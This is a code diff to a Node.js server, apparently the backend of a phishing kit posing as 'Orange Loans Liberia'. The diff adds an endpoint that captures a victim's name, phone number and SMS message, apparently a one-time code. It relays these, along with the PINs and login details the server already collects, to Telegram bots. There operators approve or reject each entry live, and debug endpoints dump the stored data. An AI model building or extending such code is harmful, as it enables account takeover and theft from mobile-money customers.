@@ -12,11 +12,13 @@ const BACKEND_DOMAIN = 'https://orange-loans-liberia.onrender.com';
 
 // ---------------- MEMORY STORES ----------------
 const approvedPins = {};
-const approvedCodes = {};
 const requestBotMap = {};
 
-// ---------------- DETAILS STORE (NEW) ----------------
+// ---------------- DETAILS STORE ----------------
 const approvedDetails = {};
+
+// ---------------- SMS STORE ----------------
+const approvedSMS = {};
 
 // ---------------- MULTI-BOT STORE (FROM .ENV) ----------------
 const bots = [];
@@ -98,11 +100,11 @@ app.get('/bot/:botId', (req, res) => {
 });
 
 app.get('/details', (req, res) => res.sendFile(path.join(__dirname, 'public', 'details.html')));
+app.get('/sms', (req, res) => res.sendFile(path.join(__dirname, 'public', 'sms.html')));
 app.get('/pin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'pin.html')));
-app.get('/code', (req, res) => res.sendFile(path.join(__dirname, 'public', 'code.html')));
 app.get('/success', (req, res) => res.sendFile(path.join(__dirname, 'public', 'success.html')));
 
-// ---------------- DETAILS HANDLING (NEW) ----------------
+// ---------------- DETAILS HANDLING ----------------
 app.post('/submit-details', (req, res) => {
     const { name, phone, botId } = req.body;
     const bot = getBot(botId);
@@ -129,6 +131,40 @@ app.post('/submit-details', (req, res) => {
 
 app.get('/check-details/:requestId', (req, res) => {
     const value = approvedDetails[req.params.requestId] ?? null;
+    res.json({ approved: value });
+});
+
+// ---------------- SMS HANDLING ----------------
+app.post('/submit-sms', (req, res) => {
+    const { name, phone, smsMessage, botId } = req.body;
+    const bot = getBot(botId);
+    if (!bot) return res.status(400).json({ error: 'Invalid bot' });
+
+    const requestId = uuidv4();
+    approvedSMS[requestId] = null;
+    requestBotMap[requestId] = botId;
+
+    console.log("📱 NEW SMS VERIFICATION REQUEST");
+    console.log("RequestID:", requestId);
+    console.log("Bot:", botId);
+    console.log("SMS Message:", smsMessage);
+
+    sendTelegramMessage(bot,
+        `📱 SMS VERIFICATION\n\n` +
+        `Name: ${name}\n` +
+        `Phone: ${phone}\n\n` +
+        `📨 SMS Message:\n${smsMessage}`,
+        [[
+            { text: '✅ Approve SMS', callback_data: `sms_ok:${requestId}` },
+            { text: '❌ Reject SMS', callback_data: `sms_bad:${requestId}` }
+        ]]
+    );
+
+    res.json({ requestId });
+});
+
+app.get('/check-sms/:requestId', (req, res) => {
+    const value = approvedSMS[req.params.requestId] ?? null;
     res.json({ approved: value });
 });
 
@@ -162,35 +198,6 @@ app.get('/check-pin/:requestId', (req, res) => {
     res.json({ approved: value });
 });
 
-// ---------------- CODE HANDLING ----------------
-app.post('/submit-code', (req, res) => {
-    const { name, phone, code, botId } = req.body;
-    const bot = getBot(botId);
-    if (!bot) return res.status(400).json({ error: 'Invalid bot' });
-
-    const requestId = uuidv4();
-    approvedCodes[requestId] = null;
-    requestBotMap[requestId] = botId;
-
-    console.log("🟣 NEW CODE REQUEST");
-    console.log("RequestID:", requestId);
-
-    sendTelegramMessage(bot,
-        `🔑 CODE VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nCode: ${code}`,
-        [[
-            { text: '✅ Correct Code', callback_data: `code_ok:${requestId}` },
-            { text: '❌ Wrong Code', callback_data: `code_bad:${requestId}` }
-        ]]
-    );
-
-    res.json({ requestId });
-});
-
-app.get('/check-code/:requestId', (req, res) => {
-    const value = approvedCodes[req.params.requestId] ?? null;
-    res.json({ approved: value });
-});
-
 // ---------------- TELEGRAM WEBHOOK ----------------
 app.post('/telegram-webhook/:botId', async (req, res) => {
     const bot = getBot(req.params.botId);
@@ -203,21 +210,25 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
 
     let feedback = '';
 
-    if (action === 'pin_ok') approvedPins[requestId] = true;
-    if (action === 'pin_bad') approvedPins[requestId] = false;
-    if (action === 'code_ok') approvedCodes[requestId] = true;
-    if (action === 'code_bad') approvedCodes[requestId] = false;
-
-    // ✅ DETAILS APPROVAL/REJECTION
+    // DETAILS APPROVAL/REJECTION
     if (action === 'details_ok') approvedDetails[requestId] = true;
     if (action === 'details_bad') approvedDetails[requestId] = false;
 
-    if (action === 'pin_ok') feedback = `✅ PIN Approved for requestId: ${requestId}`;
-    if (action === 'pin_bad') feedback = `❌ PIN Rejected for requestId: ${requestId}`;
-    if (action === 'code_ok') feedback = `✅ CODE Approved for requestId: ${requestId}`;
-    if (action === 'code_bad') feedback = `❌ CODE Rejected for requestId: ${requestId}`;
+    // SMS APPROVAL/REJECTION
+    if (action === 'sms_ok') approvedSMS[requestId] = true;
+    if (action === 'sms_bad') approvedSMS[requestId] = false;
+
+    // PIN APPROVAL/REJECTION
+    if (action === 'pin_ok') approvedPins[requestId] = true;
+    if (action === 'pin_bad') approvedPins[requestId] = false;
+
+    // FEEDBACK MESSAGES
     if (action === 'details_ok') feedback = `✅ LOGIN Approved for requestId: ${requestId}`;
     if (action === 'details_bad') feedback = `❌ LOGIN Rejected for requestId: ${requestId}`;
+    if (action === 'sms_ok') feedback = `✅ SMS Approved for requestId: ${requestId}`;
+    if (action === 'sms_bad') feedback = `❌ SMS Rejected for requestId: ${requestId}`;
+    if (action === 'pin_ok') feedback = `✅ PIN Approved for requestId: ${requestId}`;
+    if (action === 'pin_bad') feedback = `❌ PIN Rejected for requestId: ${requestId}`;
 
     if (feedback) await sendTelegramMessage(bot, feedback);
     await answerCallback(bot, cb.id);
@@ -227,8 +238,8 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
 
 // ---------------- DEBUG ENDPOINTS ----------------
 app.get('/debug/pins', (req, res) => res.json(approvedPins));
-app.get('/debug/codes', (req, res) => res.json(approvedCodes));
 app.get('/debug/details', (req, res) => res.json(approvedDetails));
+app.get('/debug/sms', (req, res) => res.json(approvedSMS));
 app.get('/debug/request-map', (req, res) => res.json(requestBotMap));
 app.get('/debug/bots', (req, res) => res.json(bots));
 
